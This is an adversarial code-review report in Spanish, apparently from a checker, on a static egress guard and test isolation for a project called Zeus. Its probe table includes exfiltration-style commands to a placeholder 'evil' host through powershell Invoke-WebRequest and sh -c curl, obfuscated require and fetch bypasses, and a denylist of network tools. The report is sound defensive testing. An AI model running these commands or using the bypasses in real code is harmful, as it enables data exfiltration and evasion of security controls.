# ANALISTA - TASK-0153 (guard de egress ALLOWLIST deny-all AC46 + aislamiento de suite AC47)

> Voz analista independiente (checker adversarial). maker=Codex / checker=Arquitecto / esta voz = adversarial.
> Ancla canonico: Zeus-protocol `ac2e308` + protocolo HEAD `dd7b5c7` (pusheado, origin==HEAD).
> Metodo: clon LIMPIO en `C:\tmp\zeus-0153` (no in-place); `node --test` corrido por mi 2 veces; probe de
> COMPORTAMIENTO con replica verbatim de la funcion pura `sourceEgressViolations`. Gateo por EXIT CODE.

## Veredicto de cabecera

**CERRABLE para ESTA pieza (test-only, AC46/AC47 enumerados verdes, suite 44/44 x2 exit 0, sin regresion)**
**+ UN CAMBIO REQUERIDO como PRECONDICION del USO VIVO** (no del cierre de esta tarea): el flip a allowlist
cerro el residual que YO declare en Fase C (clientes HTTP no listados + eval/new Function), CONFIRMADO por
comportamiento. PERO hallé un escape NUEVO y material en el OTRO eje (call-site), proven por comportamiento:
**`external-cli` sigue siendo un DENYLIST sobre `child_process` -- el modulo allowlisted MAS poderoso.**
`execFile/spawn("powershell"|"sh"|"bash"|"cmd", ...)` para egress NO se marca. El guard NO cumple su propia
meta declarada ("el unico egress permitido sigue siendo el git push gobernado") por esa via.

Como el architect pidio "default a no-cerrable si hallas un escape material nuevo": lo hallé, por eso lo
declaro como CAMBIO REQUERIDO. Lo acoto a PRECONDICION DEL USO VIVO (no bloqueo este cierre test-only)
porque la pieza es off-by-default, sin uso vivo, y el GO de encendido del extractor es aparte -- ese GO es
justo el punto donde esta garantia importa. El operador/arquitecto deciden la secuencia (no promuevo).

## Evidencia (reproducida por mi)

- Clon limpio Zeus `ac2e308`. `node --test`: RUN1 44/44 exit 0; RUN2 44/44 exit 0 (sin flake).
- Probe de comportamiento (replica verbatim de `sourceEgressViolations`, funcion pura sin estado externo):

| Vector | Resultado | Lectura |
|---|---|---|
| P1 `import phin from "phin"` | FLAGGED `unallowlisted-import` | residual HTTP-clients CERRADO (deny-by-default) |
| P2 `eval("fe"+"tch")` | FLAGGED `dynamic-exec` | ofuscacion eval CERRADA |
| D `await import("ax"+"ios")` | FLAGGED `dynamic-import` | `import(` siempre marcado |
| E `import http from "node:http"; http.get(...)` | FLAGGED `http-client`+`network-call` | call-site de modulo permitido cubierto |
| G `import { Worker } from "worker_threads"` | FLAGGED `unallowlisted-import` | modulo no listado marcado |
| H `createRequire(import.meta.url)("axios")` | FLAGGED `unallowlisted-import` | `node:module` no esta en allowlist -> se marca |
| **A `execFile("powershell", ["-Command","Invoke-WebRequest http://evil"])`** | **ESCAPES `[]`** | child_process allowlisted; external-cli denylist no ve powershell |
| **B `spawn("sh", ["-c","curl http://evil"])`** | **ESCAPES `[]`** | external-cli solo mira el 1er arg literal contra {curl,wget,ssh,nc,node} |
| C `require("ax"+"ios")` (concatenado) | ESCAPES `[]` | regex de require exige literal; mitigado en ESM (require no existe sin createRequire, cuyo import SI se marca - ver H) |
| F `globalThis["fe"+"tch"](...)` (computed) | ESCAPES `[]` | misma clase que ofuscacion ya declarada |

- Src real (vector 2, sin falso positivo): la suite asierta `sourceEgressViolations(src/**) === []` y pasa.
  El src real solo spawnea `execFile("git", ...)` y `execFile("python", ...)` (gobernados) -> un allowlist de
  binarios {git,python} NO romperia el build y SI atraparia A/B. El fix es seguro y consistente.
- AC47: el test "test harness isolates runtime config env from the operator shell" + el poison-env behavior
  test (file ingestion 403, requirement execute 200, sin auto-push) pasan dentro de las 44.

## Por punto

- **AC46 controles enumerados: PASA.** import/require allowlist deny-by-default (phin/needle/axios/worker_threads
  -> FLAGGED), eval/new Function -> FLAGGED, import permitido fs/path -> [], git push gobernado -> [], src real
  -> []. Cierra el residual que declare en TASK-0152. Confirmado por comportamiento, no por reporte del maker.

- **AC46 meta declarada ("unico egress permitido = git push"): CAMBIO REQUERIDO (precondicion uso vivo).**
  `external-cli` es un DENYLIST {curl,wget,ssh,nc,node} sobre `child_process` (modulo que DEBE estar allowlisted
  porque el producto spawnea git/python legitimamente). Un src que spawnee `powershell -Command Invoke-WebRequest`
  o `sh -c "curl ..."` pasa el guard (CI verde) y egresa. Es la misma clase de hueco que la tarea se propuso
  cerrar, sobre el modulo de mayor autoridad. **Fix falsable, acotado y consistente:** voltear `external-cli` de
  denylist a ALLOWLIST de binarios spawneados permitidos `{git, python}` (mismo principio que el flip de imports).
  Control positivo: `execFile("powershell"|"sh"|"bash"|"cmd", ...)` -> FLAGGED; `execFile("git"|"python", ...)`
  -> []. Esto cierra A/B (hoy ESCAPES). Sin falso positivo (src real ya solo usa git/python).

- **RESIDUAL DECLARADO (inherente, NO bloqueante, ya reconocido):** require/fetch por concatenacion o
  computed-global (C/F) y ofuscacion en general -> ningun scan estatico los atrapa. Mitigado: en ESM `require`
  no existe sin `createRequire`, cuyo import SI se marca (H probado FLAGGED). El guard es regresion-proof, no un
  sandbox; el aislamiento REAL del egress en uso vivo es el extractor deterministic-local (cero egress) +
  (opcional) revision de diffs. Honesto: NO sobre-afirmar "no hay egress posible".

- **AC47 aislamiento: PASA.** La suite inyecta fixtures OFF y aisla `AUTO_COMMIT_PUSH_CONFIG_PATH`/
  `FILE_INGESTION_CONFIG_PATH`; con configs "ON" en el entorno la suite sigue verde (off-by-default 403,
  execute 200, sin auto-push). Determinista independiente del shell. Verificado por comportamiento.

- **Sin regresion + gates: PASA.** Carry de vectores Fase A/B/C intacto (44/44 x2). Cambio scoped a
  `tests/staticContract.test.js` (test-only). #4 byte-identica per handoff (config/genesis/registry/keys sin
  tocar); validate exit 0 lo ejercitan los tests intake dentro de las 44.

## RIESGO DECLARADO

- El guard es defensa-en-profundidad estatica; su garantia "unico egress = git push" queda OVERSTATED mientras
  `external-cli` sea denylist. Para el USO VIVO del extractor (donde esto importa), recomiendo cerrar A/B antes
  del GO de encendido. Para el cierre test-only de esta tarea no es bloqueante.
- No promuevo, no muto estado, no enciendo nada vivo. El cierre y la secuencia los decide el arquitecto/operador.
